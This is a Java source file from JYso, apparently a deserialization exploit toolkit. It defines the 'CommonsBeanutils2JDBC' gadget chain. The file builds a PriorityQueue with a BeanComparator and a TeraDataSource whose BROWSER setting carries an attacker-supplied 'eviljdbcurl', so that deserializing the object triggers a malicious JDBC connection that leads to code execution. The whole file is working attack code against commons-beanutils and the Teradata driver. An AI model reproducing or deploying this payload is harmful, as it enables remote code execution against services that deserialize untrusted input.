package com.qi4l.JYso.gadgets;

import com.qi4l.JYso.gadgets.annotation.Authors;
import com.qi4l.JYso.gadgets.annotation.Dependencies;
import com.qi4l.JYso.gadgets.utils.Reflections;
import com.teradata.jdbc.TeraDataSource;
import org.apache.commons.beanutils.BeanComparator;

import java.util.PriorityQueue;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2"})
@Authors({Authors.QI4L})
public class CommonsBeanutils2JDBC implements ObjectPayload<Object> {
    public Object getObject(String command) throws Exception {
        if (!command.toLowerCase().startsWith("jdbc:")) {
            throw new Exception("Command format is: eviljdbcurl");
        }

        TeraDataSource dataSource = new TeraDataSource();
        dataSource.setBROWSER(command);
        dataSource.setLOGMECH("BROWSER");
        dataSource.setDSName("127.0.0.1");
        dataSource.setDbsPort("10250");

        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);

        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add("1");
        queue.add("1");

        Reflections.setFieldValue(comparator, "property", "connection");
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = dataSource;
        queueArray[1] = dataSource;

        return queue;
    }
}
